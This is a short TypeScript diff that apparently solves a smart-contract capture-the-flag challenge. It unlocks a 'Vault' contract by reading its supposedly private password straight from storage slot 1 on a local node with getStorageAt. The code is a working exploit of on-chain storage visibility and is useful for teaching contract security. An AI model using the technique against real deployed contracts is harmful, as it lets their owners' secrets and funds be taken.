@@ -8,6 +8,9 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const provider = ethers.getDefaultProvider("http://localhost:8545");
+  const pwd = await provider.getStorageAt(victim.address, 1);
+  await victim.unlock(pwd);
 };
 
 export default helper;
